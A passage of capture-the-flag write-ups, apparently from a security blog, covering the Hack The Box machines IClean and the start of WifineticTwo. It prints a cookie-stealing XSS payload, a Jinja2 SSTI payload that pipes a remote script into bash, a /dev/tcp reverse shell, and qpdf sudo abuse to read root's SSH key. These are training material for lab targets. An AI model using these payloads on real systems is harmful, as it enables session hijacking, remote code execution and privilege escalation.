<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-08 12:02 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.43.201
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.077s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 10.33 seconds
</span></span></code></pre></div><p>We find two open ports 22 (SSH) and 80 (HTTP - Apache)</p>
<p>We get redirected to <code>capiclean.htb</code> when trying to access the web server. We need to add it to the <code>/etc/hosts</code> file to access the website.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.12 capiclean.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>The web application is a cleaning service.</p>
<p><img src="/images/HTB-IClean/capiclean.png" alt="IClean website"></p>
<p>After looking around we found two functionalities that we may be able to exploit.</p>
<ul>
<li><code>http://capiclean.htb/quote</code> (using the <code>GET A QUOTE</code> button) leads us to a form where we can select which services we desire and also input an email address.</li>
</ul>
<p><img src="/images/HTB-IClean/capiclean-quote.png" alt="capiclean quote"></p>
<p>After submitting an email address we get to <code>http://capiclean.htb/sendMessage</code>.</p>
<p><img src="/images/HTB-IClean/capiclean-quote2.png" alt="capiclean quote thank you message"></p>
<ul>
<li><code>http://capiclean.htb/login</code> leads to a login form with the usual username:password credentials.</li>
</ul>
<p><img src="/images/HTB-IClean/capiclean-login.png" alt="capiclean login"></p>
<p>Running gobuster we find  <code>/dashboard</code> but we get redirected to the Home page when we try to access it probably because we don&rsquo;t have a valid cookie.</p>
<pre tabindex="0"><code>gobuster dir -u http://capiclean.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src="/images/HTB-IClean/gobuster.png" alt="directory brute forcing"></p>
<p>We intercept the request we get after submitting the email at <code>/quote</code>, since there is a login feature but no sign in it button let&rsquo;s try to steal a session cookie in order to gain access the other pages.</p>
<p><img src="/images/HTB-IClean/quote-request.png" alt="Request intercepted"></p>
<p>Now we use our payload before sending the request.</p>
<p><img src="/images/HTB-IClean/XSS-cookie-steal.png" alt="XSS cookie steal"></p>
<p><strong>XSS Payload</strong></p>
<pre tabindex="0"><code>&lt;img+src%3dx+onerror%3dthis.src%3d&#34;http%3a//&lt;IP_ADDRESS&gt;%3a&lt;PORT_NUMBER&gt;/cookie.php&#34;%2bbtoa(document.cookie)&gt;
</code></pre><p>We get the base64 cookie value.</p>
<p><img src="/images/HTB-IClean/base64-cookie.png" alt="base64 cookie value"></p>
<p><strong>Base64 cookie value</strong></p>
<pre tabindex="0"><code>c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlpoSGZEUS5HNXJKMEhWdkJwaGFjcHIxR3pJbTlwaFFYanM=
</code></pre><p>We use the command below to decode it.</p>
<pre tabindex="0"><code>echo &#39;COOKIE_VALUE&#39; | base64 -d
</code></pre><p><img src="/images/HTB-IClean/COOKIE-value.png" alt="cookie value decoded"></p>
<p>After adding it to our browser, we are able to access <code>/dashboard</code>.</p>
<p><img src="/images/HTB-IClean/capiclean-dashboard.png" alt="IClean dashboard"></p>
<p>In <code>Generate Invoice</code>  we can fill the form and get an <code>Invoice ID</code>.</p>
<p><img src="/images/HTB-IClean/invoice-generator.png" alt="IClean invoice generator"></p>
<p><img src="/images/HTB-IClean/Invoice-ID.png" alt="IClean invoice ID"></p>
<p>Using that ID in <code>Generate QR</code> will create a QR code link, submitting that link allows us to see our invoice document.</p>
<p><img src="/images/HTB-IClean/Generate-QR.png" alt="IClean Generate QR code"></p>
<p><img src="/images/HTB-IClean/Invoice-doc.png" alt="IClean Invoce document"></p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>The application is clearly using some template engine to create the invoice documents which means it might be vulnerable to <code>Server Side Template Injection (SSTI)</code>. The thing is we need to find which template engine is being used.</p>
<p>Using <code>Wappalyzer</code> I identify that the application is using <code>Flask</code> and we know that the commonly used template engines for Python are Jinja2, Mako, Genshi and Cheetah.</p>
<p><img src="/images/HTB-IClean/wappalyzer.png" alt="IClean wapplayzer"></p>
<p>This <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python" target="_blank" >HackTricks</a>

 page has various payloads to test for SSTI and identify the specific template used.</p>
<p>We confirm that <code>Jinja2</code> is being used by using the payload <code>{{config}}</code> which returns the server&rsquo;s configuration. Now we just need to find the right payload to execute our commands on the server.</p>
<p><img src="/images/HTB-IClean/SSTI-test.png" alt="SSTI test"></p>
<p><img src="/images/HTB-IClean/SSTI-test2.png" alt="SSTI test results"></p>
<p>After numerous fails I found a working payload on <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#filter-bypasses" target="_blank" >hacktricks</a>

.</p>
<pre tabindex="0"><code>{%25with+a%3drequest|attr(&#34;application&#34;)|attr(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\x5f\x5fbuiltins\x5f\x5f&#34;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;ls${IFS}-l&#39;)|attr(&#39;read&#39;)()%25}{%25print(a)%25}{%25endwith%25}
</code></pre><p><img src="/images/HTB-IClean/SSTI-payload.png" alt="SSTI payload"></p>
<p>The next step is to prompt the server to run our reverse shell. To do this, we’ll establish a Python server on our local machine and set up a listener on a port of our choosing. This will allow us to receive incoming connections from the reverse shell.</p>
<p>Below is the content of my reverse shell file.</p>
<pre tabindex="0"><code>#!/bin/bash

sh -i &gt;&amp; /dev/tcp/IP_ADDRESS/PORT_NUMBER 0&gt;&amp;1
</code></pre><blockquote>
<p>The reverse shell is inside the <code>revshell.sh</code> file. After we send the request containing our payload, the server fetches it from our python server and executes it.</p>
</blockquote>
<pre tabindex="0"><code>{%25with+a%3drequest|attr(&#34;application&#34;)|attr(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\x5f\x5fbuiltins\x5f\x5f&#34;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;curl+http%3a//&lt;IP_ADDRESS&gt;%3a&lt;PORT_NUMBER&gt;/revshell.sh+|+bash&#39;)|attr(&#39;read&#39;)()%25}{%25print(a)%25}{%25endwith%25}
</code></pre><p>We get a shell as <code>www-data</code>.</p>
<p><img src="/images/HTB-IClean/foothold.png" alt="IClean foothold"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>In <code>/home</code> we are unable to access the directory <code>consuela</code>.</p>
<p><img src="/images/HTB-IClean/consuella-denied.png" alt="IClean access denied"></p>
<p>Looking around we find some database credentials  in <code>opt/app/app.py</code>.</p>
<p><img src="/images/HTB-IClean/db-credentials.png" alt="IClean database credentials"></p>
<p>After running <code>ss -lntp</code> we see a service running on port 3306 which is <code>MySQL</code> default port.</p>
<p><img src="/images/HTB-IClean/services.png" alt="IClean internal services"></p>
<p>We connect to the database with <code>iclean:pxCsmnGLckUb</code></p>
<pre tabindex="0"><code>mysql -u iclean -p
</code></pre><p>In the <code>capiclean</code> database we find a table called <code>users</code> which contains the password hash for the  user <code>consuela</code>.</p>
<p><img src="/images/HTB-IClean/users-table.png" alt="IClean database users table"></p>
<p>Using <a href="https://crackstation.net/" target="_blank" >crackstation</a>

 we get the user password which is <code>simple and clean</code>.</p>
<p><img src="/images/HTB-IClean/hash-cracked.png" alt="password hash cracked"></p>
<blockquote>
<p>The spaces are also part of the password.</p>
</blockquote>
<p>With the credentials <code>consuela:simple and clean</code> we login via SSH and retrieve the user flag <code>user.txt</code></p>
<p><img src="/images/HTB-IClean/user-flag.png" alt="user flag"></p>
<p><code>sudo -l</code> reveals that the user can run <code>/usr/bin/qpdf</code> as root.</p>
<p><img src="/images/HTB-IClean/sudo-l.png" alt="sudo -l command"></p>
<p>Going through the documentation for <a href="https://qpdf.readthedocs.io/en/stable/cli.html#option-add-attachment" target="_blank" >qpdf</a>

 we find that <code>--add-attachment</code> can be used to add attachments to a file.</p>
<p>From here we have two ways to get the root flag. We can grab the root SSH key by attaching it to a pdf file and login as the root user or we can directly attach the root flag (because it is simply a .txt file) to a pdf file, open it in a document viewer and read the flag.</p>
<h3 id="first-method">First method</h3>
<p>First we attach the SSH key for the root user to a pdf file, connect as the root user via SSH and grab the root flag.</p>
<pre tabindex="0"><code>sudo /usr/bin/qpdf --empty /tmp/root.pdf --qdf --add-attachment /root/.ssh/id_rsa --
</code></pre><p>The SSH key is in the output of the file. We only need to do <code>cat root.pdf</code> to get the SSH private key for the root user.</p>
<p><img src="/images/HTB-IClean/root-ssh-key.png" alt="root ssh key"></p>
<p>We copy it to our local machine and make sure to change the permission with <code>chmod 600</code>. We can then login as root via ssh.</p>
<pre tabindex="0"><code>ssh root@capiclean.htb -i id_rsa
</code></pre><p><img src="/images/HTB-IClean/root-flag.png" alt="root flag"></p>
<h3 id="second-method">Second method</h3>
<p>For this method we upload a dummy pdf on the target and we attach the root flag to it.</p>
<pre tabindex="0"><code>sudo /usr/bin/qpdf --add-attachment /root/root.txt -- dummy.pdf root2.pdf
</code></pre><p>We download the output file <code>root2.pdf</code> in this example. I used the default document viewer on my Kali VM. Click on the scrolling menu in the upper-left corner and choose <code>Attachments</code>.</p>
<p><img src="/images/HTB-IClean/pdf-attachment.png" alt="PDF Viewer Attachments"></p>
<p>Double click <code>root.txt</code> and it will reveal the root flag.</p>
<p><img src="/images/HTB-IClean/root-flag2.png" alt="root.txt file"></p>
<h2 id="closing-words">Closing Words</h2>
<p>This box was easily one of my favorite on the platform, I like how inovative it was with the vulnerability chain. If you&rsquo;d like to learn more about the web vulnerabilities featured on this box, you can do so on TryHackMe where they have some rooms focused on them (this not an exhaustive list).</p>
<p>XSS -&gt; <a href="https://tryhackme.com/r/room/axss" target="_blank" >XSS</a>

 and <a href="https://tryhackme.com/r/room/xss" target="_blank" >Intro to Cross-site Scripting</a>

</p>
<p>SSTI -&gt; <a href="https://tryhackme.com/r/room/serversidetemplateinjection" target="_blank" >Server-side Template Injection</a>

 and <a href="https://tryhackme.com/r/room/learnssti" target="_blank" >SSTI</a>

</p>
<p>For a more structured path, you can check PortSwigger academy (totally free) <a href="https://portswigger.net/web-security/all-topics" target="_blank" >here</a>

, they cover all those web vulnerabilities and more.</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: WifineticTwo</title>
            <link>https://scorpiosec.com/posts/2024/07/htb-wifinetictwo/</link>
            <pubDate>Fri, 26 Jul 2024 15:04:48 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/07/htb-wifinetictwo/</guid>
            <description>Platform: Hack The Box Link: WifineticTwo Level: Medium OS: Linux WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an accessible OpenPLC page using default credentials. Utilizing CVE-2021-31630, we gain an initial foothold and capture the user flag. Once inside the target system, we brute-force the WPS key, configure the wireless interface, and scan the default gateway to discover internal services. We then access the Lua Configuration Interface, set up a new password, log in via SSH, and retrieve the root flag.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/WifineticTwo" target="_blank" >WifineticTwo</a>

</li>
<li>Level: Medium</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an accessible OpenPLC page using default credentials. Utilizing CVE-2021-31630, we gain an initial foothold and capture the user flag. Once inside the target system, we brute-force the WPS key, configure the wireless interface, and scan the default gateway to discover internal services. We then access the Lua Configuration Interface, set up a new password, log in via SSH, and retrieve the root flag.</p>
<p>Target IP address - <code>10.10.11.7</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/WifineticTwo 10.10.11.7
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-25 16:39 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.7
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.044s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE    VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   FourOhFourRequest: 
</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">404</span> NOT FOUND
</span></span><span style="display:flex;"><span>|     content-type: text/html; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     content-length: <span style="color:#ae81ff">232</span>
</span></span><span style="display:flex;"><span>|     vary: Cookie
</span></span><span style="display:flex;"><span>|     set-cookie: session<span style="color:#f92672">=</span>eyJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoQ.AmaMpNOmDGYGQIpwEDtx5obFU08; Expires<span style="color:#f92672">=</span>Thu, 25-Apr-2024 21:44:45 GMT; HttpOnly; Path<span style="color:#f92672">=</span>/
</span></span><span style="display:flex;"><span>|     server: Werkzeug/1.0.1 Python/2.7.18
</span></span><span style="display:flex;"><span>|     date: Thu, <span style="color:#ae81ff">25</span> Apr <span style="color:#ae81ff">2024</span> 21:39:45 GMT
</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;404 Not Found&lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Not Found&lt;/h1&gt;
</span></span><span style="display:flex;"><span>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
</span></span><span style="display:flex;"><span>|   GetRequest: 
</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">302</span> FOUND
</span></span><span style="display:flex;"><span>|     content-type: text/html; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     content-length: <span style="color:#ae81ff">219</span>
</span></span><span style="display:flex;"><span>|     location: http://0.0.0.0:8080/login
</span></span><span style="display:flex;"><span>|     vary: Cookie
</span></span><span style="display:flex;"><span>|     set-cookie: session<span style="color:#f92672">=</span>eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoA.yRUPYgrZ-4AxE2_xa8pbWYvKGq8; Expires<span style="color:#f92672">=</span>Thu, 25-Apr-2024 21:44:44 GMT; HttpOnly; Path<span style="color:#f92672">=</span>/
</span></span><span style="display:flex;"><span>|     server: Werkzeug/1.0.1 Python/2.7.18
</span></span><span style="display:flex;"><span>|     date: Thu, <span style="color:#ae81ff">25</span> Apr <span style="color:#ae81ff">2024</span> 21:39:44 GMT
</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;Redirecting...&lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
</span></span><span style="display:flex;"><span>|     &lt;p&gt;You should be redirected automatically to target URL: &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login&#34;</span>&gt;/login&lt;/a&gt;. If not click the link.
</span></span><span style="display:flex;"><span>|   HTTPOptions: 
</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>|     content-type: text/html; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     allow: HEAD, OPTIONS, GET
</span></span><span style="display:flex;"><span>|     vary: Cookie
</span></span><span style="display:flex;"><span>|     set-cookie: session<span style="color:#f92672">=</span>eyJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoA.Q1AI3_zm-RnXi7eGU_QELZS5lag; Expires<span style="color:#f92672">=</span>Thu, 25-Apr-2024 21:44:44 GMT; HttpOnly; Path<span style="color:#f92672">=</span>/
</span></span><span style="display:flex;"><span>|     content-length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>|     server: Werkzeug/1.0.1 Python/2.7.18
</span></span><span style="display:flex;"><span>|     date: Thu, <span style="color:#ae81ff">25</span> Apr <span style="color:#ae81ff">2024</span> 21:39:44 GMT
</span></span><span style="display:flex;"><span>|   RTSPRequest: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad request
</span></span><span style="display:flex;"><span>|     content-length: <span style="color:#ae81ff">90</span>
</span></span><span style="display:flex;"><span>|     cache-control: no-cache
</span></span><span style="display:flex;"><span>|     content-type: text/html
</span></span><span style="display:flex;"><span>|     connection: close
</span></span><span style="display:flex;"><span>|     &lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;
</span></span><span style="display:flex;"><span>|     Your browser sent an invalid request.
</span></span><span style="display:flex;"><span>|_    &lt;/body&gt;&lt;/html&gt;
</span></span><span style="display:flex;"><span>| http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>|_Requested resource was http://10.10.11.7:8080/login
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port8080-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>4/25%Time<span style="color:#f92672">=</span>662ACD97%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r
</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">(</span>GetRequest,24C,<span style="color:#e6db74">&#34;HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/htm
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:l;\x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:.0\.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZn
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Jlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.ZirNoA\.yRUPYgrZ-4AxE2_xa8pbW
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:YvKGq8;\x20Expires=Thu,\x2025-Apr-2024\x2021:44:44\x20GMT;\x20HttpOnly;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20Thu,\x2025\x20Apr\x202024\x2021:39:44\x20GMT\r\n\r\n&lt;!DOCTYPE\x20HTML
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\&#34;&gt;\n&lt;title&gt;Red
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:irecting\.\.\.&lt;/title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;/h1&gt;\n&lt;p&gt;You\x20should\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20&lt;a\x20hre
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:f=\&#34;/login\&#34;&gt;/login&lt;/a&gt;\.\x20\x20If\x20not\x20click\x20the\x20link\.&#34;</span><span style="color:#f92672">)</span>%
</span></span><span style="display:flex;"><span>SF:r<span style="color:#f92672">(</span>HTTPOptions,14E,<span style="color:#e6db74">&#34;HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:;\x20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Co
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:okie\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.ZirNoA\.Q1AI
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:3_zm-RnXi7eGU_QELZS5lag;\x20Expires=Thu,\x2025-Apr-2024\x2021:44:44\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:GMT;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:eug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Thu,\x2025\x20Apr\x202024\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:021:39:44\x20GMT\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,CF,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0request\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncont
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ent-type:\x20text/html\r\nconnection:\x20close\r\n\r\n&lt;html&gt;&lt;body&gt;&lt;h1&gt;4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:00\x20Bad\x20request&lt;/h1&gt;\nYour\x20browser\x20sent\x20an\x20invalid\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:request\.\n&lt;/body&gt;&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourOhFourRequest,224,<span style="color:#e6db74">&#34;HTTP/1\.0\x20404
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncon
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tent-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcG
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:VybWFuZW50Ijp0cnVlfQ\.ZirNoQ\.AmaMpNOmDGYGQIpwEDtx5obFU08;\x20Expires=T
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:hu,\x2025-Apr-2024\x2021:44:45\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Thu,\x2025\x20Apr\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x202024\x2021:39:45\x20GMT\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:3C//DTD\x20HTML\x203\.2\x20Final//EN\&#34;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/ti
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tle&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20aga
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:in\.&lt;/p&gt;\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 17.39 seconds
</span></span></code></pre></div><p>Our scan reveals two open ports 22 (SSH) and 8080 (http-proxy).</p>
<h2 id="enumeration">Enumeration</h2>
<p>We find a login form at <code>http://10.10.11.7:8080</code> for OpenPLC Webserver.</p>
<p><img src="/images/HTB-WifineticTwo/OpenPLC-webserver.png" alt="OpenPLC login form"></p>
<p>The default credentials allow us to login.</p>
<p><img src="/images/HTB-WifineticTwo/openplc-creds.png" alt="OpenPLC default credentials"></p>
<p>We access the Dashboard. The different sections give us some information but nothing is standing out at the moment.</p>
<p><img src="/images/HTB-WifineticTwo/openPLC-dashboard.png" alt="OpenPLC dashboard"></p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>We find <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-31630" target="_blank" >CVE-2021-31630</a>

 which is a command injection vulnerability for Open PLC Webserver v3 and an exploit is available <a href="https://github.com/Hunt3r0x/CVE-2021-31630-HTB" target="_blank" >here</a>

.</p>
<blockquote>
<p>To make this exploit work you have to add the target IP as <code>wifinetictwo.htb</code> in your <code>/etc/hosts</code> file.</p>
</blockquote>
<p>After running the exploit we catch a shell on out listener.</p>
<pre tabindex="0"><code>python ./exploit.py -ip &lt;IP_ADDRESS&gt; -p &lt;PORT_NUMBER&gt; -u openplc -pwd openplc
</code></pre><p><img src="/images/HTB-WifineticTwo/openplc-rce.png" alt="OpenPLC RCE"></p>
